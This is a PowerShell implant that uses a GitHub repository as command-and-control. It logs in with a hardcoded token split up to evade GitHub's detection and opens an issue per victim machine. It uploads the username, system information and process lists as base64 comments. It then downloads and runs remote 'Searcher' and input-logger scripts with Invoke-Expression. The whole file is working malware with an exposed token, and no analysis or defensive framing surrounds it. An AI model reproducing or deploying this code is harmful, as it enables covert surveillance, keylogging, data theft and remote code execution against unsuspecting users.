#Use this function to upload to CNRD in the package format so the comments can be easily parsed later
function Send-PackageMessage
{
	[CmdletBinding()] Param
    (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("pack","package","packname")][String] $packageName,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("issueNum","issue","issNum","iss")][int] $issueNumber,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("message","text")][String] $body
    )
	
	#If we're uploading a file, it's already base64 encoded. Use this logic to avoid re-encoding it.
    try
    {
		If($packageName -like "FILE_*")
		{
			$mergedBody = "PKG{" + $packageName + "}:" + $body
			New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNumber -Body $mergedBody
			#Write-Host ("DEBUG: Used non-encoding logic to upload the file.")
		}
		Else
		{
			$encodedBody = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($body))
			$mergedBody = "PKG{" + $packageName + "}:" + $encodedBody
			New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNumber -Body $mergedBody
		}
    }
    catch
    {
        New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNumber -Body ("PKG{EXCEPTION}:Exception thrown trying to upload a package message. Exiting. Error: " + $Error)
		Write-Console -Body ("Exception thrown trying to upload a package message. Exiting. Error: " + $Error) -IssueNumber $issueNumber
		#Write-Host ("DEBUG: Exception thrown trying to upload a package message. Exiting. Error: " + $Error); Start-Sleep -s 600
		Exit
    }
}

#Use this function to write to the console log so timestamps get inserted properly
function Write-Console
{
	[CmdletBinding()] Param
    (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("message","text")][String] $body,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("issueNum","issue","issNum","iss")][int] $issueNumber
    )

	$consoleLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\console.data"
	$timeStamp = Get-Date -Format G
	try
	{
		Add-Content -Path $consoleLogPath -Value ($timeStamp + ": " + $body)
	}
	catch
	{
		Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to write to the console. Exiting. Error: " + $Error)
		#Write-Host ("DEBUG: Exception thrown trying to write to the console. Exiting. Error: " + $Error); Start-Sleep -s 600
		Exit
	}
}

#ENTRY POINT
#Confirm that NuGet is installed. If not, install it and confirm installation.
If((Get-PackageProvider).Name -clike 'NuGet')
{
	#Write-Host "DEBUG: NuGet OK."
}
Else
{
	try
	{
		#Write-Host "DEBUG: NuGet not found. Attempting to install NuGet..."
		Install-PackageProvider -Name NuGet -scope CurrentUser -Force
		#Write-Host "DEBUG: NuGet installation command has finished executing."

		#Verify that NuGet was installed correctly.
		If((Get-PackageProvider).Name -clike 'NuGet')
		{
			#Write-Host "DEBUG: NuGet installation appears to be successful."
		}
		Else
		{
			#Write-Host "DEBUG: NuGet installation appears to have failed. Exiting."; Start-Sleep -s 600
			Exit
		}
	}
	catch
	{
		#Write-Host "DEBUG: NuGet installation threw an exception. Exiting."; Start-Sleep -s 600
		Exit
	}
}

#Confirm that PowerShellForGitHub is installed. If not, install it and confirm installation.
If((Get-InstalledModule).Name -clike 'PowerShellForGitHub')
{
	#Write-Host "DEBUG: PowerShellForGitHub OK."
}
Else
{
	try
	{
		#Write-Host "DEBUG: PowerShellForGitHub not found. Attempting to install PowerShellForGitHub..."
		Install-Module -Name PowerShellForGithub -Scope CurrentUser -Force
		#Write-Host "DEBUG: PowerShellForGitHub installation command has finished executing."

		#Verify that PowerShellForGitHub was installed correctly.
		If((Get-InstalledModule).Name -clike 'PowerShellForGitHub')
		{
			#Write-Host "DEBUG: PowerShellForGitHub installation appears to be successful."
		}
		Else
		{
			#Write-Host "DEBUG: PowerShellForGitHub installation appears to have failed. Exiting."; Start-Sleep -s 600
			Exit
		}
	}
	catch
	{
		#Write-Host "DEBUG: PowerShellForGitHub installation threw an exception. Exiting."; Start-Sleep -s 600
		Exit
	}
}

#We must import PSFG each time we start a new PowerShell session.
try 
{
	Import-Module -Name PowerShellForGitHub
	#Write-Host "DEBUG: PowerShellForGitHub import OK."
}
catch
{
	#Write-Host "DEBUG: PowerShellForGitHub import threw an exception. Exiting."; Start-Sleep -s 600
	Exit
}

#Disable telemetry on PSFG.
try 
{
	Set-GitHubConfiguration -DisableTelemetry -SessionOnly
	#Write-Host "DEBUG: Telemetry disabled OK."
}
catch 
{
	#Write-Host "DEBUG: Disabling telemetry threw an exception. Exiting."; Start-Sleep -s 600
	Exit
}

#Login to GitHub using our auth token. Make sure to split up the token so GitHub can't detect it and disable it for us.
try 
{
	$token = 'ffbc' + 'f7ac0f2e' + '9b703fcfd17e4f' + 'ab4104269e81ad'
	$secure = ConvertTo-SecureString $token -AsPlainText -Force
	$cred = New-Object System.Management.Automation.PSCredential "USERNAME_IS_IGNORED", $secure
	Set-GitHubAuthentication -Credential $cred
	$user = Get-GitHubUser -Current
	If($user.login -clike 'BeinnUais1')
	{
		#Write-Host "DEBUG: Logged in succesfully."
	}
	Else
	{
		#Write-Host "DEBUG: Login failed. Exiting."; Start-Sleep -s 600
		Exit
	}
}
catch 
{
	#Write-Host "DEBUG: Exception or error thrown while trying to log in to GitHub. Exiting."; Start-Sleep -s 600
	Exit
}

#Use Get-ComputerInfo to get the allegedly unique ProductID which is used to identify the specific machine during communications with CNRD.
$compInfo = Get-ComputerInfo
#Write-Host "DEBUG: Finished getting computer info."

#Use Get-Process to get a list of running processes for later upload.
$procInfo = (Get-Process).ProcessName
#Write-Host "DEBUG: Finished getting process info."

#Declare the issue number variable here so it remains in scope. Zero is not a valid issue number, so that can be used for error checking.
$issueNumber = 0

#Get the issue number this machine will use to communicate. If an issue for this machine does not exist, create one and verify it was created successfully.
try
{
	$issueList = Get-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1
	$issueList | ForEach-Object -Process `
	{
		If($_.Title -clike $compInfo.WindowsProductID)
		{
			$issueNumber = $_.number
			#Write-Host "DEBUG: Found the issue number for this machine OK."	
		}
	}
	#Only executes if the $issueNumber wasn't set above because the ProductID has no associated issue.
	If($issueNumber -clike "0")
	{
		New-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1 -Title $compInfo.WindowsProductID -Body $env:USERNAME
		#Write-Host "DEBUG: Just tried to create a new issue for this machine. Verifying..."
		$issueList = Get-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1
		$issueList | ForEach-Object -Process `
		{
			If($_.Title -clike $compInfo.WindowsProductID)
			{
				$issueNumber = $_.number
				#Write-Host "DEBUG: New issue for this machine created OK."
			}
		}
		#Confirm that $issueNumber now has the correct issue number that we created above.
		If($issueNumber -clike "0")
		{
			#Write-Host "DEBUG: Issue creation failed. Unable to find an issue associated with this machine."; Start-Sleep -s 600
			Exit
		}
	}
}
catch
{
	#Write-Host ("DEBUG: Exception thrown trying to identify or create an issue associated with this machine. Exiting."); Start-Sleep -s 600
	Exit
}

#Check if $env:UserProfile\Documents\WindowsPowerShell exists, if not, create and verify it. We are now logged in to GitHub and can post an error message.
$logFolderPath = "$env:USERPROFILE\Documents\WindowsPowerShell"
if ($logFolderPath | Test-Path)
{
	#Write-Host "DEBUG: Logs folder located OK."
}
Else
{
	try
	{
		#Write-Host "DEBUG: Trying to create the logs folder..."
		[System.IO.Directory]::CreateDirectory($logFolderPath)
		#Write-Host "DEBUG: No exceptions thrown creating the logs folder. Verifying..."
	}
	catch
	{
		Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to create the logs folder. Error: " + $Error)
		#Write-Host "DEBUG: Exception thrown trying to create the logs folder. Notified CNRD. Exiting."; Start-Sleep -s 600
		Exit
	}
	if (-not ($logFolderPath | Test-Path))
	{
		Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("No exceptions thrown, but unable to locate the logs folder. Exiting.")
		#Write-Host "DEBUG: Unable to locate the logs folder despite no exceptions being thrown. Notified CNRD. Exiting."; Start-Sleep -s 600
		Exit
	}
}

#Write startup confirmation to console log
Write-Console -Body "Startup OK!" -IssueNumber $issueNumber
Write-Console -Body "Uploading log to CNRD..." -IssueNumber $issueNumber

#Upload the console log to CNRD, then clear it.
try 
{
	$consoleLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\console.data"
	If([System.IO.File]::Exists($consoleLogPath))
	{
		Send-PackageMessage -Package "CONSOLE" -IssueNumber $issueNumber -Body (Get-Content -Path $consoleLogPath -Raw)
		#Write-Host "DEBUG: Uploaded the console log to CNRD. Clearing it..."
		Clear-Content -Path $consoleLogPath
		Write-Console -Body "Uploaded the console log and cleared it." -IssueNumber $issueNumber
		#Write-Host "DEBUG: Cleared the old console log."
	}
	Else
	{
		Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Attempted to upload the console log, but was unable to find the file. Exiting.")
		Write-Console -Body "Attempted to upload the console log, but was unable to find the file. Exiting." -IssueNumber $issueNumber
		#Write-Host "DEBUG: Attempted to upload the console log, but was unable to find the file. Exiting."; Start-Sleep -s 600
		Exit
	}
}
catch 
{
	Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to upload the console log file. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to upload the console log file. Notified CNRD. Exiting." -IssueNumber $issueNumber
	#Write-Host "DEBUG: Exception thrown trying to upload the console log file. Notified CNRD. Exiting."; Start-Sleep -s 600
	Exit
}

#Upload the computer info
try
{
    Send-PackageMessage -Package "COMPINFO" -IssueNumber $issueNumber -Body ($compInfo | Out-String)
    Write-Console -Body "Uploaded the computer info to CNRD." -IssueNumber $issueNumber
	#Write-Host "DEBUG: Uploaded the computer info to CNRD."
}
catch
{
    Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to upload the computer info. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to upload the computer info. Notified CNRD. Exiting." -IssueNumber $issueNumber
	#Write-Host "DEBUG: Exception thrown trying to upload the computer info. Notified CNRD. Exiting."; Start-Sleep -s 600
	Exit
}

#Upload the process info
try
{
    Send-PackageMessage -Package "PROCINFO" -IssueNumber $issueNumber -Body ($procInfo | Out-String)
    Write-Console -Body "Uploaded the process info to CNRD." -IssueNumber $issueNumber
	#Write-Host "DEBUG: Uploaded the process info to CNRD."
}
catch
{
    Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to upload the process info. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to upload the process info. Notified CNRD. Exiting." -IssueNumber $issueNumber
	#Write-Host "DEBUG: Exception thrown trying to upload the process info. Notified CNRD. Exiting."; Start-Sleep -s 600
	Exit
}

#Execute the Search script
try
{
	Write-Console -Body "Attempting to execute searcher..." -IssueNumber $issueNumber
	#Write-Host "DEBUG: Attempting to execute searcher..."
	(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials
	(Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/BeinnUais1/ceannard1/master/Searcher.ps1') | Invoke-Expression
}
catch
{
	Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to start the searcher. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to start the searcher. Notified CNRD. Exiting." -IssueNumber $issueNumber
	#Write-Host "DEBUG: Exception thrown trying to start the searcher. Notified CNRD. Exiting."; Start-Sleep -s 600
	Exit
}

#Execute the Input script (loops endlessly, always put this last in the list of packages to be executed)
try
{
	Write-Console -Body "Attempting to execute input logger..." -IssueNumber $issueNumber
	#Write-Host "DEBUG: Attempting to execute input logger..."
	(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials
	(Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/BeinnUais1/ceannard1/master/Input.ps1') | Invoke-Expression
}
catch
{
	Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to start the input logger. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to start the input logger. Notified CNRD. Exiting." -IssueNumber $issueNumber
	#Write-Host "DEBUG: Exception thrown trying to start the input logger. Notified CNRD. Exiting."; Start-Sleep -s 600
	Exit
}
